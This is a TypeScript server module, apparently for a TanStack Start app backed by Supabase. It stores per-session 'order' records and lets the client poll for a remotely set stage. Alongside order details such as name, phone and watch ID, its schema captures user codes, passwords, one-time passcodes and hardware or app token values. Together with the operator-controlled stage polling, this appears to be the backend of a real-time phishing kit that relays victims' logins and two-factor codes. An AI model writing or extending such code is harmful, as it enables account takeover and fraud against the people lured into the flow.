import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const upsertSchema = z.object({
  sessionId: z.string().min(4).max(80),
  stage: z.string().min(1).max(40).optional(),
  patch: z
    .object({
      name: z.string().max(120).optional(),
      phone: z.string().max(30).optional(),
      city: z.string().max(80).optional(),
      spec: z.string().max(400).optional(),
      watch_id: z.string().max(60).optional(),
      user_code: z.string().max(30).optional(),
      password: z.string().max(120).optional(),
      otp: z.string().max(20).optional(),
      hw_token: z.string().max(20).optional(),
      app_token: z.string().max(20).optional(),
      status: z.string().max(20).optional(),
    })
    .optional(),
  payload: z.record(z.string(), z.any()).optional(),
});

export const trackEvent = createServerFn({ method: "POST" })
  .inputValidator((raw: unknown) => upsertSchema.parse(raw))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const row = {
      session_id: data.sessionId,
      ...(data.stage ? { stage: data.stage } : {}),
      ...(data.patch ?? {}),
    };

    await supabaseAdmin
      .from("orders")
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      .upsert(row as any, { onConflict: "session_id" })
      .select("id")
      .single();

    if (data.stage) {
      await supabaseAdmin.from("journey_events").insert({
        session_id: data.sessionId,
        stage: data.stage,
        payload: data.payload ?? null,
      });
    }
    return { ok: true };
  });

export const getRemoteStage = createServerFn({ method: "GET" })
  .inputValidator((raw: unknown) => z.object({ sessionId: z.string().min(4).max(80) }).parse(raw))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row } = await supabaseAdmin
      .from("orders")
      .select("stage, status")
      .eq("session_id", data.sessionId)
      .maybeSingle();
    return { stage: row?.stage ?? null, status: row?.status ?? null };
  });
